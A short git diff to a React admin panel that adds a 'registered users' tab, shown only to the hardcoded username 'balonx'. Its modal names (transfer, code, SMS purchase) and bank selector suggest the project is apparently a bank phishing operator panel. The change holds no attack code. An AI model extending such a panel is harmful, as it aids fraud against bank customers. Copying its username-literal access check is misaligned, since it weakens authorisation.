@@ -8,6 +8,7 @@ import { useAuth } from '@/hooks/use-auth';
 import Sidebar from '@/components/admin/Sidebar';
 import AccessTable from '@/components/admin/AccessTable';
 import UserManagement from '@/components/admin/UserManagement';
+import RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagement';
 import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal } from '@/components/admin/Modals';
 import { Session, ScreenType } from '@shared/schema';
 import { Button } from '@/components/ui/button';
@@ -17,7 +18,7 @@ import { nanoid } from 'nanoid';
 export default function AdminPanel() {
   const { toast } = useToast();
   const [activeBank, setActiveBank] = useState<string>("todos");
-  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users'>('current');
+  const [activeTab, setActiveTab] = useState<'current' | 'saved' | 'users' | 'registered'>('current');
   const { user, logoutMutation } = useAuth();
   const [activeModal, setActiveModal] = useState<string | null>(null);
   const [clientLink, setClientLink] = useState<string>('');
@@ -569,6 +570,16 @@ export default function AdminPanel() {
                 Usuarios
               </div>
             )}
+            {user?.username === 'balonx' && (
+              <div 
+                className={`tab cursor-pointer pb-2 border-b-2 ${activeTab === 'registered' 
+                  ? 'border-[#00aaff] text-[#00aaff]' 
+                  : 'border-transparent hover:text-gray-300'}`}
+                onClick={() => setActiveTab('registered')}
+              >
+                Usuarios Registrados
+              </div>
+            )}
           </div>
           
           <div className="flex items-center space-x-2">
@@ -590,6 +601,8 @@ export default function AdminPanel() {
         {/* Content based on active tab */}
         {activeTab === 'users' ? (
           <UserManagement />
+        ) : activeTab === 'registered' ? (
+          <RegisteredUsersManagement />
         ) : (
           <AccessTable 
             sessions={sessions}
